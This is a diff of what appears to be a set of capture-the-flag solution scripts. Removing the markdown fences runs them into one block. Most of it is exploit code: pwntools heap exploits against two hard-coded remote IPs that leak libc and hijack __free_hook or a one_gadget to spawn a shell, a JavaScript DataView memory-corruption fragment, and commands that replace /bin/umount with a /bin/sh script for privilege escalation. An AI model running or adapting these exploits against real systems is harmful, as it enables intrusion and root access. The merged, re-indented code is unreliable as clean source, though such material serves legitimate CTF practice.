@@ -62,11 +62,6 @@ def main():
 
 if __name__ == '__main__':
     main()
-```
-
-
-
-```
 from Crypto.Util.number import *
 from magic_box import *
 
@@ -134,16 +129,11 @@ def main():
 
 if __name__ == '__main__':
     main()
-```
-
-
-
-```
 # -*- coding: utf-8 -*-
 from pwn import *
-#p=process('./1')
+    #p=process('./1')
 p=remote('124.71.147.225',9999)
-#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    #libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
 libc=ELF('libc.so.6')
 elf=ELF('./1')
 context(arch='amd64', os='linux')
@@ -172,7 +162,7 @@ def show(size):
  p.sendline(str(size))
 
 add(0x20,'SonodaMari')
-#debug()
+    #debug()
 add(-0xa0,'a')
 add(-0xb0,'a')
 delete(-0xa0)
@@ -191,31 +181,21 @@ add(0x80,'a')
 show(0x80)
 libc.address=(u64(p.recvuntil('x7f')[-6:].ljust(8,'x00'))-libc.sym['__malloc_hook'])&0xfffffffff000
 lg('libc.address',libc.address)
-#p.interactive()
+    #p.interactive()
 add(0x50,p64(libc.sym['__free_hook']))
 add(0x51,'/bin/sh')
 add(0x52,p64(libc.sym['system']))
 delete(0x51)
 p.interactive()
-```
-
-
-
-```
 realloc(0x40)
 free
-```
-
-
-
-```
 from pwn import *
 p=process('./1')
 elf=ELF('./1')
-#libc=ELF('libc.so.6')
+    #libc=ELF('libc.so.6')
 libc=ELF('libc.so.6')
-#p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})
-#libc=ELF('/glibc/2.27/64/lib/libc-2.27.so')
+    #p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})
+    #libc=ELF('/glibc/2.27/64/lib/libc-2.27.so')
 p=remote('124.71.185.75',9999)
 context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])
 context.log_level='debug'
@@ -233,36 +213,31 @@ def config(a):
 def rain():
     p.recvuntil('ch> ')
     p.sendline('3')
-#debug()
+    #debug()
 config('x00'*0x12+'a'*0x40)
 config('x00'*0x12)
 config('x00'*0x12)
-#p.interactive()
+    #p.interactive()
 
 rain()
 config(0x12*'xff'+p64(0x602f18)*5+p64(0x400e17)+p64(0x602f18)*2)
-#config('x00'*0x12+p64(elf.plt['puts'])*8)
+    #config('x00'*0x12+p64(elf.plt['puts'])*8)
 config('x00'*0x12)
 config('x00'*0x12)
 p.recvuntil('ch> ')
 p.sendline('2')
 libc.address=u64(p.recvuntil('x7f')[-6:].ljust(8,'x00'))-libc.sym['putchar']
 lg('libc.address',libc.address)
-#config(0x12*'xff'+'/bin/shx00'*5+p64(libc.sym['system'])+'/bin/shx00')
+    #config(0x12*'xff'+'/bin/shx00'*5+p64(libc.sym['system'])+'/bin/shx00')
 og=[0x4f365,0x4f3c2,0xe58b8,0xe58bf,0xe58c3,0x10a45c,0x10a468]
-#debug()
+    #debug()
 
 config('xff'*0x12+'shx00x00x00x00x00x00'*5+p64(libc.address+og[5])+'SonodaMari')
 p.recvuntil('')
 p.recvuntil('ch> ')
 p.sendline('2')
 p.interactive()
-#debug()
-```
-
-
-
-```
+    #debug()
 a1 = DataView(0x18)
 a2 = DataView(0x18)
 a3 = DataView(0x18)
@@ -293,23 +268,13 @@ a5.setUint32(0, libc1-0x1967f0+0x91871)
 a5.setUint32(4, libc2)
 a6.setUint16(0, 0x1111)
 a = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
-```
-
-
-
-```
 rm /bin/umount
 echo "#!/bin/sh" > /bin/umount
 echo "/bin/sh" >> /bin/umount
 chmod +x /bin/umount
 exit
-```
-
-
-
-```
-#include <stdio.h>
-#include <stdint.h>
+    #include <stdio.h>
+    #include <stdint.h>
 uint32_t key[4]={0x4445,0x4144 ,0x4245,0x4546 };
 
 void decrypt(uint32_t v0, uint32_t v1)
@@ -337,12 +302,7 @@ int main()
     return 0;
 }
 //XBvfaEdQvbcrxPBh8AOcJ6gA
-```
-
-
-
-```
-#include<stdio.h>
+    #include<stdio.h>
 int main()
 {
  int dword_7FF7B8035B80[44] ={  5,  143,  158,  121,  42,  192,  104,  129,  45,  252,  207,  164,  181,  85,  95,  228,  157,  35,  214,  29,  241,  231,  151,  145,  6,  36,  66,  113,  60,  88,  92,  48,  25,  198,  245,  188,  75,  66,  93,  218,  88,  155,  36,  64};
